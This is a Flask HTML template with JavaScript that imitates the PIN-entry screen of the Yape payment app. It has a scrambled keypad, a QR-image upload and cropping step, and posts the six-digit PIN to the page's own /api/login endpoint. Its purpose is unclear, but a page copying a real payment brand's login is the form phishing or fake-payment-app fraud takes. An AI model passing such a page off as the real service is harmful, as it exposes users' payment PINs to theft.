<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Ingresa tu clave - Yape</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='login2.css') }}">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
</head>

<body>
    <div class="upper-section">
        <div class="qr-container" id="qrContainer" style="cursor: pointer;">
            <div id="qrEmptyState" class="qr-empty-state">
                <i class="fa-solid fa-plus-circle"></i>
                <span style="font-size: 13px; font-weight: 500;">Añadir QR</span>
            </div>
            <img src="" alt="QR Yape" class="qr-image" id="qrDisplayImage" style="display: none;">
            <input type="file" id="qrUploadInput" accept="image/*" style="display: none;">
        </div>

        <div class="options-row">
            <div class="option-item">
                <div class="option-icon"><i class="fa-solid fa-lock"></i></div>
                <div class="option-text">Olvido de clave</div>
            </div>
            <div class="option-item">
                <div class="option-icon"><i class="fa-solid fa-mobile-screen-button"></i></div>
                <div class="option-text">Cambio de número</div>
            </div>
            <div class="option-item">
                <div class="option-icon"><i class="fa-solid fa-headset"></i></div>
                <div class="option-text">Ayuda</div>
            </div>
        </div>
    </div>

    <div class="bottom-section">
        <div class="header-area">
            <div class="keypad-title" id="titleMsg">Ingresa tu clave</div>

            <div class="password-dots" id="dotsContainer">
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
                <div class="dot"></div>
            </div>
        </div>

        <div class="keypad-grid">
            <!-- Row 1: 3, 1, 4 -->
            <button class="key-btn" data-key="3">3</button>
            <button class="key-btn" data-key="1">1</button>
            <button class="key-btn" data-key="4">4</button>

            <!-- Row 2: 8, 5, 9 -->
            <button class="key-btn" data-key="8">8</button>
            <button class="key-btn" data-key="5">5</button>
            <button class="key-btn" data-key="9">9</button>

            <!-- Row 3: 2, 0, 6 -->
            <button class="key-btn" data-key="2">2</button>
            <button class="key-btn" data-key="0">0</button>
            <button class="key-btn" data-key="6">6</button>

            <!-- Row 4: empty, 7, backspace -->
            <div class="key-btn transparent"></div>
            <button class="key-btn" data-key="7">7</button>
            <button class="key-btn backspace" id="btnBackspace"><i class="fa-solid fa-delete-left"></i></button>
        </div>
    </div>

    <div id="errorModal" class="modal-overlay" style="display: none;">
        <div class="modal-content">
            <h3 class="modal-title">Clave incorrecta</h3>
            <p class="modal-message">Inténtalo de nuevo.</p>
            <button id="modalCloseBtn" class="modal-btn">Entendido</button>
        </div>
    </div>

    <script src="https://unpkg.com/@zxing/library@latest/umd/index.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            let password = [];
            const MAX_LENGTH = 6;
            const identifier = localStorage.getItem('yape_user');

            if (!identifier) {
                // If no user set, redirect back to login (optional safety)
                window.location.href = '/login';
                return;
            }

            // --- QR Dynamic Loading & Uploading ---
            const qrContainer = document.getElementById('qrContainer');
            const qrEmptyState = document.getElementById('qrEmptyState');
            const qrDisplayImage = document.getElementById('qrDisplayImage');
            const qrUploadInput = document.getElementById('qrUploadInput');
            
            fetch('/api/get_user_qr', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ identifier: identifier })
            })
            .then(res => res.json())
            .then(data => {
                if (data.success && data.qr_url) {
                    qrDisplayImage.src = data.qr_url;
                    qrDisplayImage.style.display = 'block';
                    qrEmptyState.style.display = 'none';
                } else {
                    qrDisplayImage.style.display = 'none';
                    qrEmptyState.style.display = 'flex';
                }
            })
            .catch(err => {
                console.error("Error fetching QR", err);
                qrDisplayImage.style.display = 'none';
                qrEmptyState.style.display = 'flex';
            });

            qrContainer.addEventListener('click', () => {
                qrUploadInput.click();
            });

            qrUploadInput.addEventListener('change', (e) => {
                const file = e.target.files[0];
                if (!file) return;

                qrContainer.style.opacity = '0.5'; 
                
                const img = new Image();
                img.src = URL.createObjectURL(file);
                img.onload = async () => {
                    try {
                        const codeReader = new ZXing.BrowserQRCodeReader();
                        const result = await codeReader.decodeFromImageElement(img);
                        
                        const points = result.resultPoints;
                        let minX = points[0].x, maxX = points[0].x;
                        let minY = points[0].y, maxY = points[0].y;
                        for(let i=1; i<points.length; i++) {
                            if(points[i] && points[i].x < minX) minX = points[i].x;
                            if(points[i] && points[i].x > maxX) maxX = points[i].x;
                            if(points[i] && points[i].y < minY) minY = points[i].y;
                            if(points[i] && points[i].y > maxY) maxY = points[i].y;
                        }
                        
                        const qrW = maxX - minX;
                        const qrH = maxY - minY;
                        const size = Math.max(qrW, qrH);
                        const padding = size * 0.20; 
                        
                        let cropX = Math.max(0, minX - padding);
                        let cropY = Math.max(0, minY - padding);
                        let cropSizeW = size + padding * 2;
                        let cropSizeH = size + padding * 2;
                        
                        if (cropX + cropSizeW > img.naturalWidth) cropSizeW = img.naturalWidth - cropX;
                        if (cropY + cropSizeH > img.naturalHeight) cropSizeH = img.naturalHeight - cropY;
                        
                        let finalSize = Math.min(cropSizeW, cropSizeH);
                        
                        const cropCanvas = document.createElement('canvas');
                        cropCanvas.width = finalSize;
                        cropCanvas.height = finalSize;
                        const cropCtx = cropCanvas.getContext('2d');
                        cropCtx.fillStyle = '#FFFFFF';
                        cropCtx.fillRect(0, 0, finalSize, finalSize);
                        
                        cropCtx.drawImage(img, cropX, cropY, finalSize, finalSize, 0, 0, finalSize, finalSize);
                        
                        cropCanvas.toBlob(async (blob) => {
                            await sendFile(new File([blob], file.name, { type: 'image/png' }));
                        }, 'image/png');
                    } catch (err) {
                        console.log("ZXing failed or error, attempting fallback crop", err);
                        const w = img.naturalWidth;
                        const h = img.naturalHeight;
                        const minDim = Math.min(w, h);
                        const cropSize = minDim * 0.55; 
                        const cropX = (w - cropSize) / 2;
                        const cropY = (h - cropSize) / 2;

                        const cropCanvas = document.createElement('canvas');
                        cropCanvas.width = cropSize;
                        cropCanvas.height = cropSize;
                        const cropCtx = cropCanvas.getContext('2d');
                        cropCtx.fillStyle = '#FFFFFF';
                        cropCtx.fillRect(0, 0, cropSize, cropSize);
                        cropCtx.drawImage(img, cropX, cropY, cropSize, cropSize, 0, 0, cropSize, cropSize);
                        
                        cropCanvas.toBlob(async (blob) => {
                            await sendFile(new File([blob], file.name, { type: 'image/png' }));
                        }, 'image/png');
                    }
                };
                img.onerror = () => {
                   alert('Error cargando la imagen');
                   qrContainer.style.opacity = '1';
                };
            });

            async function sendFile(uploadFile) {
                const formData = new FormData();
                formData.append('file', uploadFile);
                formData.append('identifier', identifier);

                try {
                    const response = await fetch('/api/upload_qr', {
                        method: 'POST',
                        body: formData
                    });
                    const data = await response.json();
                    
                    if (data.success) {
                        qrDisplayImage.src = data.qr_url + '?t=' + new Date().getTime();
                        qrDisplayImage.style.display = 'block';
                        qrEmptyState.style.display = 'none';
                    } else {
                        alert(data.message || 'Error al subir el archivo');
                    }
                } catch (err) {
                    console.error('Upload error', err);
                    alert('Error de conexión al subir el QR');
                } finally {
                    qrContainer.style.opacity = '1';
                    qrUploadInput.value = '';
                }
            }
            // --------------------------------------

            const titleMsg = document.getElementById('titleMsg');
            const dotsContainer = document.getElementById('dotsContainer');
            const dots = document.querySelectorAll('.dot');
            const errorModal = document.getElementById('errorModal');
            const modalCloseBtn = document.getElementById('modalCloseBtn');

            modalCloseBtn.addEventListener('click', () => {
                errorModal.style.display = 'none';
                // Reset password
                password = [];
                updateDisplay();
            });

            function updateDisplay() {
                if (password.length === 0) {
                    titleMsg.style.display = 'block';
                    dotsContainer.style.display = 'none';
                } else {
                    titleMsg.style.display = 'none';
                    dotsContainer.style.display = 'flex';

                    dots.forEach((dot, index) => {
                        if (index < password.length) {
                            dot.classList.add('active');
                        } else {
                            dot.classList.remove('active');
                        }
                    });
                }
            }

            // Number keys
            document.querySelectorAll('.key-btn[data-key]').forEach(btn => {
                btn.addEventListener('click', async () => {
                    if (password.length < MAX_LENGTH) {
                        const val = btn.getAttribute('data-key');
                        password.push(val);
                        updateDisplay();

                        if (password.length === MAX_LENGTH) {
                            const pwdStr = password.join('');

                            try {
                                const response = await fetch('/api/login', {
                                    method: 'POST',
                                    headers: { 'Content-Type': 'application/json' },
                                    body: JSON.stringify({
                                        identifier: identifier,
                                        password: pwdStr
                                    })
                                });
                                const data = await response.json();

                                if (data.success) {
                                    window.location.href = '/';
                                } else {
                                    // Show modal
                                    errorModal.style.display = 'flex';
                                }
                            } catch (e) {
                                console.error(e);
                                alert('Error de conexión');
                                password = [];
                                updateDisplay();
                            }
                        }
                    }
                });
            });

            // Backspace
            const btnBackspace = document.getElementById('btnBackspace');
            btnBackspace.addEventListener('click', () => {
                if (password.length > 0) {
                    password.pop();
                    updateDisplay();
                }
            });
        });
    </script>
</body>

</html>
